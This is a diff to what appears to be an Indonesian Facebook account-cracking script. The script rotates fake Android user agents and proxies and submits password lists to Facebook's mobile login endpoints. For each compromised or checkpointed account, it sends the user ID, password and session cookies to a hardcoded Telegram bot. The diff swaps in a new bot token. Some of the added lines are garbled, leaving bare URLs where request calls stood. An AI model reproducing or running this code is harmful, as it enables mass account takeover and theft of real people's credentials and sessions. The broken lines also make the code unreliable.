@@ -51,7 +51,7 @@ for x in range(1000):
 
     aa='Mozilla/5.0 (Linux; U; Android'
     b=random.choice(['6','7','8','9','10','11','12'])
-    c='it-it; Redmi 8 Build/QKQ1.191014.001) PIXI'
+    c='it-it; Redmi 8 Build/QKQ1.191014.001) PIXI '
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -419,10 +419,10 @@ def setting():
 		exit()
 		print('')		
 	cetak(panel(f'\t             [bold green] Input Metode URL Login',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]VALIDATE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
-	print(f' [{b}01{x}]. Login from {b}Duolingo{x} (slow)')
+	print(f' [{b}01{x}]. Login from {b}Marvelous{x} (slow)')
 	print(f' [{b}02{x}]. Login from {b}Tinyurl{x} (fast)')
 	print(f' [{b}03{x}]. Login from {b}Medium{x} (semi fast)')
-	print(f' [{b}04{x}]. Login from {b}Jobstreet{x} (Slow V2) {h}Recommended For Now{x}')	
+	print(f' [{b}04{x}]. Login from {b}Dior{x} (Slow V2) {h}Recommended For Now{x}')	
 	cetak(panel(f'[bold green]Notes: pilih metode yang dirasa cocok dengan device & kartu anda\ndengan cara dicoba 1 per 1[bold white]',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SIMPLE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
 	hc = input(f' [{b}?{x}] Choose : ')
 	if hc in ['1','01']:
@@ -505,22 +505,22 @@ def crack(idf,pwv):
 	global loop,ok,cp
 	prog.update(des,description=f"[white]crack {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
 	prog.advance(des)
-	ua = random.choice(ugen)
+	ua = random.choice(ugen2)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
 			if 'uadia' in uadarimu: ua = uadia[0]
 			nip=random.choice(prox)
-			#proxs= {'http': 'socks5://'+nip}
-			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fapp_id%3D234536436609303%26cbt%3D1666111613800%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df32104d6c415f2c%2526domain%253Did.duolingo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.duolingo.com%25252Ff1b4fef4967364%2526relation%253Dopener%26client_id%3D234536436609303%26display%3Dpopup%26domain%3Did.duolingo.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.duolingo.com%252F%253FisLoggingIn%253Dtrue%26locale%3Den_US%26logger_id%3Df2bff8c6ec697fc%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df30ec6f31ffe34%2526domain%253Did.duolingo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.duolingo.com%25252Ff1b4fef4967364%2526relation%253Dopener%2526frame%253Df1f70cf2243217%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv7.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df30ec6f31ffe34%26domain%3Did.duolingo.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.duolingo.com%252Ff1b4fef4967364%26relation%3Dopener%26frame%3Df1f70cf2243217%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=popup&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v7.0/dialog/oauth?app_id=234536436609303&cbt=1666111613800&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df32104d6c415f2c%26domain%3Did.duolingo.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.duolingo.com%252Ff1b4fef4967364%26relation%3Dopener&client_id=234536436609303&display=popup&domain=id.duolingo.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fid.duolingo.com%2F%3FisLoggingIn%3Dtrue&locale=en_US&logger_id=f2bff8c6ec697fc&origin=1&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df30ec6f31ffe34%26domain%3Did.duolingo.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.duolingo.com%252Ff1b4fef4967364%26relation%3Dopener%26frame%3Df1f70cf2243217&response_type=token%2Csigned_request%2Cgraph_domain&scope=email&sdk=joey&version=v7.0&ret=login&fbapp_pres=0&tp=unspecified","flow":"login_no_pin","pass":pw,}
+#			proxs= {'http': 'socks5://'+nip}
+			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F07%252Fnew-ways-to-create-instagram-reels-remix%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdc=1&_rdr#_=_")
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fapp_id%3D234536436609303%26cbt%3D1666111613800%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df32104d6c415f2c%2526domain%253Did.duolingo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.duolingo.com%25252Ff1b4fef4967364%2526relation%253Dopener%26client_id%3D234536436609303%26display%3Dpopup%26domain%3Did.duolingo.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.duolingo.com%252F%253FisLoggingIn%253Dtrue%26locale%3Den_US%26logger_id%3Df2bff8c6ec697fc%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df30ec6f31ffe34%2526domain%253Did.duolingo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.duolingo.com%25252Ff1b4fef4967364%2526relation%253Dopener%2526frame%253Df1f70cf2243217%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv7.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df30ec6f31ffe34%26domain%3Did.duolingo.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.duolingo.com%252Ff1b4fef4967364%26relation%3Dopener%26frame%3Df1f70cf2243217%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=popup&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
-			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
+			heade={"Host": "m.facebook.com","connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "XMLHttpRequest","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": "https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={idf}\n{pw}")
+				https://api.telegram.org/bot5442935736:AAHjdbHR1eokgcUhA8DnYYQqBxp4nXLKafM/sendMessage?chat_id=-1001808963086&text={idf}\n{pw}
 				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold red]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI CP {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
 				#tree = Tree(f"RESULTS CP {tgl} {bln} {thn}")
 				#tree.add(f"[bold yellow]{idf}|{pw}")
@@ -534,8 +534,8 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{kuki}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI OK {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
-				requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={idf}\n{pw}\n{kuki}")
+				https://api.telegram.org/bot5442935736:AAHjdbHR1eokgcUhA8DnYYQqBxp4nXLKafM/sendMessage?chat_id=-1001808963086&text={idf}\n{pw}\n{kuki}
+				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{kuki}[/]",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI OK {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
 				#tree = Tree(f"RESULTS OK {tgl} {bln} {thn}")
 				#tree.add(f"[bold green]{idf}|{pw}")
 				#tree.add(f"[bold green]{kuki}[/]")
